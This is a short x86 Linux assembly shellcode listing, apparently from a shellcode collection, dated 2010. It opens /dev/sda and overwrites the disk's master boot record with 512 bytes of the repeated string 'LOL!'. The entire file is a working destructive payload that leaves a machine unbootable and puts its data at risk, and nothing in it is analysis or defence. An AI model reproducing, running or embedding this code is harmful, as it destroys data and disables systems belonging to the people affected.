; linux/x86 overwrite MBR on /dev/sda with `LOL!' 43 bytes
; root@thegibson
; 2010-01-15

section .text
        global _start

_start:
        ; open("/dev/sda", O_WRONLY);
        mov al, 5
        xor ecx, ecx
        push ecx
        push dword 0x6164732f
        push dword 0x7665642f
        mov ebx, esp
        inc ecx
        int 0x80

        ; write(fd, "LOL!"x128, 512);
        mov ebx, eax
        mov al, 4
        cdq
        push edx
        mov cl, 128
        fill:
                push dword 0x214c4f4c
        loop fill
        mov ecx, esp
        inc edx
        shl edx, 9
        int 0x80